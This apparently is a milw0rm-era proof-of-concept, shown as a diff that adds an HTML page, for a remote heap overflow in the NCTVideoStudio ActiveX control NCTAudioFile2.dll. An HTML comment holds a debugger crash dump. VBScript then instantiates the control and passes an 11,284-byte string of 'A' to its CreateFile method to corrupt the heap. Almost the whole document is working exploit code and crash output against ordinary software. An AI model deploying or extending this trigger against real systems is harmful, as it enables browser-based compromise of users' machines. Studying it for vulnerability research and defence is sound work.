@@ -1,0 +1,76 @@
+<html>
+----------------------------------------------------------- <br/>
+Author : Mountassif Mouad (Stack)              <br/>
+----------------------------------------------------------- <br/>
+NCTVideoStudio ActiveX DLLs Version 1.6 Reamote Heap Overflow Poc <br/>
+----------------------------------------------------------- <br/>
+<!--
+Report for Clsid: {77829F14-D911-40FF-A2F0-D11DB8D6D0BC}
+RegKey Safe for Script: False
+RegKey Safe for Init: False
+Implements IObjectSafety: True
+IDisp Safe:  Safe for untrusted: caller,data       
+Registers: In olly                
+--------------------------------------------------     
+EAX 00000001
+ECX 7FFDF000
+EDX 00150608
+EBX 41414141
+ESP 0013EFAC
+EBP 0013F00C
+ESI 00150000
+EDI 41414139
+EIP 7C97DF51 ntdll.7C97DF51
+Block Disassembly:
+--------------------------------------------------
+7C97DF40 PUSH 0
+7C97DF42 PUSH ESI
+7C97DF43 CALL 7C97CDC9
+7C97DF48 MOV EBX,[EBP+10]
+7C97DF4B LEA EDI,[EBX-8]
+7C97DF4E MOV [EBP-2C],EDI
+7C97DF51 MOVZX EAX,WORD PTR [EDI]   <--- CRASH
+7C97DF54 SHL EAX,3
+7C97DF57 MOV [EBP-30],EAX
+7C97DF5A PUSH 7C97E11C
+7C97DF5F PUSH EDI
+7C97DF60 PUSH ESI
+7C97DF61 CALL 7C97CC6D
+7C97DF66 TEST AL,AL
+7C97DF68 JE 7C97E0BF
+
+ArgDump:
+--------------------------------------------------
+EBP+8 00150000 -> 000000C8
+EBP+12 50000061
+EBP+16 41414141
+EBP+20 00150000 -> 000000C8
+EBP+24 41414141
+EBP+28 40000060
+
+Stack Dump:
+--------------------------------------------------
+13EFD4 00 00 15 00 41 41 41 41 60 00 00 40 00 00 F8 00  [........`.......]
+13EFE4 F8 EF 13 00 5C F0 13 00 18 EE 01 01 A8 EF 13 00  [....\...........]
+13EFF4 00 00 03 00 E0 F0 13 00 18 EE 91 7C F8 E0 97 7C  [................]
+13F004 FF FF FF FF 39 41 41 41 00 00 15 00 00 00 F8 00  [................]
+13F014 61 00 00 50 BE 6A 01 00 D4 EF 13 00 D8 21 F8 00  [a..P.j..........]
+Block Disassembly:
+--------------------------------------------------
+Disasm: 7C97DF51 MOVZX EAX,WORD PTR [EDI]          
+-->
+<object classid='clsid:77829F14-D911-40FF-A2F0-D11DB8D6D0BC' id='target' />
+<script language='vbscript'>
+
+'for debugging/custom prolog
+targetFile = "C:\Program Files\NCT\VideoStudio\Redist\NCTAudioFile2.dll"
+prototype  = "Sub CreateFile ( ByVal fileName As String ,  ByVal FormatType As FormatTypeConstants )"
+memberName = "CreateFile"
+progid     = "NCTAUDIOFILE2Lib.AudioFile2"
+argCount   = 2
+arg1=String(11284, "A")
+arg2=1
+target.CreateFile arg1 ,arg2
+</script>
+
+# milw0rm.com [2009-01-26]
